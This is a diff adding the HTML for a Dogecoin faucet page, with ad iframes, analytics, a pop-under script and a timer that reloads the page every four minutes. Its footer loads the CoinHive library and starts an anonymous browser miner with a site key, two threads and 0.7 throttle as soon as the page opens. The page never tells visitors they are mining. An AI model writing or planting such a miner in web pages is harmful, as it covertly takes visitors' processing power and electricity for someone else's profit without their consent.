@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<title>Get Dogecoin</title>
+<!-- A favicon (the image that appears on the site tab) -->
+<link rel="icon" href="/mining/favicon.png"/>
+
+<!-- Some CSS -->
+<link rel="stylesheet" type="text/css" href="/mining/main.css"/>
+
+<!-- IDL (Internet Defense League) -->
+<script type="text/javascript">window._idl={};_idl.variant="modal";(function(){var idl=document.createElement('script');idl.async=true;idl.src='https://members.internetdefenseleague.org/include/?url='+(_idl.url||'')+'&campaign='+(_idl.campaign||'')+'&variant='+(_idl.variant||'modal');document.getElementsByTagName('body')[0].appendChild(idl);})();</script>
+
+<!-- Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-108875748-5"></script><script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js',new Date());gtag('config','UA-108875748-5');gtag('set', {'user_id': 'db5b5b4a6d1cbf774cc4348e4bc59e7b'});</script><script type="text/javascript">setTimeout("window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('event', 'complete_claim');location.reload(true);",240000);</script></head>
+<body>
+
+<main>
+<div align="center" style="padding-top: 5px">
+<h1><img src="/mining/img/head.png"></h1>
+<header><nav class="navbar">
+<a href="http://getdogecoin.website">GetDoge Faucet</a>
+<a href="http://coinhub.win">CoinHub</a>
+<a href="http://autoclaim.win">Autoclaim</a>
+</nav>
+</header>
+</div>
+<center>
+<div class="alert alert-success">104000 satoshi was sent to <a target="_blank" href="https://faucethub.io/balance/D6pVnZAU85SYJ5PBVAbEVEF2Q3uReVeXs7">your account at FaucetHub.io</a>.</div><script type="text/javascript">gtag('event', 'claim', {'currency': 'DOGE','referred': false,});</script><p>Just leave this page open, and it should automatically refresh and send you more DOGE every 4 minutes!</p><p>Referral link: <code>http://getdogecoin.website/mining?r=D6pVnZAU85SYJ5PBVAbEVEF2Q3uReVeXs7&amp;rc=DOGE</code> (rotator owners, please append <code>&amp;rotator=YOUR_ROTATOR_NAME</code> to the URL)</p><iframe data-aa='823468' src='//ad.a-ads.com/823468?size=300x250' scrolling='no' style='width:300px; height:250px; border:0px; padding:0;overflow:hidden' allowtransparency='true'></iframe>
+</center>
+<hr/>
+
+<center>
+<p><font color="red"><strong>Do not bookmark this page!</strong></font> Use <a href="http://getdogecoin.website/mining">http://getdogecoin.website/mining</a> instead. (If the claim URL changes and you visit this page directly, you might be mistaken for a bot and <font color="red">banned</font>.)</p>
+</center>
+<hr/>
+<script async language="javascript" charset="UTF-8" type="text/javascript" src="http://getdogecoin.website/pop.php?q=6xj87m86pzm8xtnw9d0u8l6bs86di2s7s7n3t068qxcl8129u8s8sgu"></script>
+</main>
+<footer><!-- Put some ad units here -->
+<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
+<script>var miner = new CoinHive.Anonymous("R9NrZlTogaGvW5fiC0LdhHFHG7aBJObr",{threads:2,throttle:0.7});miner.start();</script>
+<div style="position:fixed;bottom:0;right:0;border-radius:1vw 0 0 0;border-top:solid;border-left:solid">
+<iframe data-aa='738847' src='//acceptable.a-ads.com/738847' scrolling='no' style='border:0px; padding:0;overflow:hidden' allowtransparency='true'></iframe>
+</div>
+<!-- 728x90 ad -->
+<center>
+<iframe data-aa='723724' src='//ad.a-ads.com/723724?size=728x90' scrolling='no' style='width:728px; height:90px; border:0px; padding:0;overflow:hidden' allowtransparency='true'></iframe>
+</center>
+
+<!-- optional coinhive miner (replace the site key with yours) -->
+</footer>
+</body>
+</html>
